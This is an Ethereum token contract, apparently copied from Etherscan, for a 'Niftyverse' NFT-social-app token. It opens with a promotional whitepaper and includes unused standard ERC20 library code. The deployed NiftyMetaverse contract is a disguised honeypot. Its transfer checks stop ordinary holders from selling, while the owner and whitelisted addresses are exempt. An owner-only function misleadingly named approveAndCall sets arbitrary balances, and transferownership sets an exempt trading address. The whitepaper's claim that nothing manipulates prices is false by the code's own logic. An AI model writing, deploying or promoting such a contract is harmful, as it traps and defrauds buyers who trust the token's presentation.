/**
 *Submitted for verification at Etherscan.io on 2022-11-09
*/

/*
Niftyverse Token
Niftyverse is a convenient tool for both creators & collectors, and a great user-friendly starting into 
the world of NFTs and mind-boggling content. Find and discover new items via Timeline and Discovery 
tools. We’re a social app with NFTs and Digital Land features. You can also create and store NFTs 
of your content with one tap. It’s simple: 
- Share digital content with your friends, use custom photo editing tools, and other special effects 
to make your photos stand out. Capture, edit, or upload videos to share moments and projects with 
your community. 
- Communicate with friends and family, share content through chat, and easily invite and send gifts 
to your friends. 
- Discover new NFT content projects from a variety of digital artists and creators 
- Like and Share your favorite artists' content with your friends and view the latest market activity 
around a collection or item to stay up-to-date on projects building traction and demand all over the world.
Mission
Unite millions of people to explore the world of DeFi and Web3 together in a simple, clear and 
entertaining way. To build a community of happy, proactive and financially independent participants 
changing the world for the better.
Vision
Blockchain technology has continued to develop and grow, and has now been expanded to various 
business fields and general technologies throughout society. Non-Fungible Tokens (NFTs) have 
emerged as a solution to the current imbalanced app and gaming market in that they can permanently 
secure digital ownership of items without the risk of hacking, counterfeiting or tampering. In previous 
generations of app, users who own certain items only have the right to use those items within the app, 
making them unable to access the items, or if other users steal the items due to a hacked app account. 
It was difficult to claim digital ownership. However, in blockchain and NFT-based apps, these problems 
are relatively low. Because it is open source, anyone can verify digital ownership of in-app items, the 
risk of loss or hacking is low, and digital ownership of those items remains entirely with the user.
Niftyverse app using blockchain and NFT preserve the value of in-app NFT and transfer them to another 
app even if the app is destroyed. In addition, through the marketplace implemented on the niftyverse app, 
NFT and tokenized assets can be traded on the blockchain. In addition, we aim for a app that allows all 
participants to participate in the decision-making and operation of important service changes in the 
ecosystem so that they can become the owners of the app. 
The goal of the NIFTYVERSE Project
Users who participate in the app should grow with the app that they enjoy, and with that growth, users 
should share a fair profit. We want to create a growth cycle of profit that anyone can understand by 
creating a value that can lead to greater growth by composing a cyclical ecosystem in the app based 
on our profits.
Each user enjoys the app and forms an asset of independent value and exchanges it with the assets 
of other users. However, the value of the assets of the content owned by users must be continuously 
recognized. We continue to recognize its value, manage and protect individual users' assets, and allow 
them to be exchanged with other users. Above all, since participants and developers must grow together 
with the app, the NIFTYVERSE project is being built on the basis of a blockchain environment. The flow 
of users' economic activities through app is very similar to the general social sharing economy phenomenon 
and the flow of growth, so it has a very large growth potential. The interconnection of each user's assets 
within the app ecosystem means that each user's effort becomes an asset. It can be said that the goal of 
the NIFTYVERSE project is to create an environment in which the value of these assets can be developed stably.
NIFTYVERSE App
Represents a set of technologies and specifications that ensure compatibility between the various products 
that constitute Niftyverse. Based on this project, the Niftyverse team will develop and release various trending 
applications. We also believe that Niftyverse can be an environment for attracting new developers and an 
application from independent teams. The app charges each product a small fee for use (e.g., marketplace 
commissions), and this revenue goes to the community treasury.
Community and the Economy
The most valuable component of any project is people. Anyone can become an active user of the applications, 
regardless of knowledge and skills in the world of blockchain and digital assets. Niftyverse is creating its own 
Academy, where educational materials will be provided for free in a simple and understandable form for everyone.
All Niftyverse apps, unlike many applications we’re used to, rely on an open, user-owned Blockchain economy 
where everyone can truly own and trade their assets. In Niftyverse, users can have fun or work toward ambitious 
goals while earning resources that will have real monetary value thanks to a free economic system and other users’ demands.
The Treasury
Serves to accumulate assets in the ecosystem. The project’s income from applications is used to replenish the
 treasury. Most of the treasury income will be distributed to Niftyverse token holders, or allocated to Niftyverse 
token redemption and burning.The other part of the treasury income is allocated to the creation of new applications, 
recruiting new developers and teams. Creating new products is necessary for the long-term growth and development 
of the entire system.
Niftyverse token holders
Anyone can become an Niftyverse token holder by purchasing it on an exchange or receiving it as a reward for using 
the Niftyverse application. The Niftyverse governance token has a limited supply, meaning the number of tokens is 
strictly limited. Most of the funds from the Niftyverse treasury are allocated to increase the value of the Niftyverse token.
Through the distribution of tokens to Niftyverse holders, or through the redemption and burning of Niftyverse tokens 
(redemption and burning means buying tokens at the market price and destroying them, which reduces the supply of 
tokens and helps increase the price).Through Niftyverse, Niftyverse will gradually become a decentralized, 
community-owned organization. This process occurs as Niftyverse is distributed to players and stakeholders, with 
token ownership by the project team becoming less concentrated over time. In the future, Niftyverse holders will 
be able to decide by vote whether to add new applications to the Niftyverse, as well as to distribute assets from the treasury.
Marketplace
Marketplace is a section in the app where users can buy, sell their NFTs. Filter and sorting are available on the 
Marketplace for easy navigation. All prices on the Marketplace are expressed in the ETH cryptocurrency. The 
Marketplace is fully blockchain-based, so to make any transaction on the Marketplace you will need to sign the transaction.
Tokenomics
Niftyverse is a ERC-20 governance token in the NIFTYVERSE universe. Niftyverse holders will be able to 
claim rewards if they stake their tokens on the app. Users of applications on the NIFTYVERSE can receive 
Niftyverse tokens as special rewards. The purpose of the Niftyverse token is to distribute the rewards generated 
by the growth and development of the NIFTYVERSE among users, developers. In the future, to decentralize the 
ownership and management of NIFTYVERSE. Niftyverse does not in any way represent any interest, participation, 
right, title in the Project, the Distributor, their respective affiliates or any other company or enterprise. Niftyverse 
does not grant token holders the right to any promises of fees, dividends, income, profits or investment returns. 
Niftyverse may only be used on NIFTYVERSE, and holding it carries no rights, express or implied, other than the 
right to use Niftyverse as a means to use and interact with NIFTYVERSE. The pricing of Niftyverse on the secondary 
market is independent of the efforts of the NIFTYVERSE team, and there is no token functionality or scheme 
designed to control or manipulate secondary prices.
*/
pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract NiftyMetaverse {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}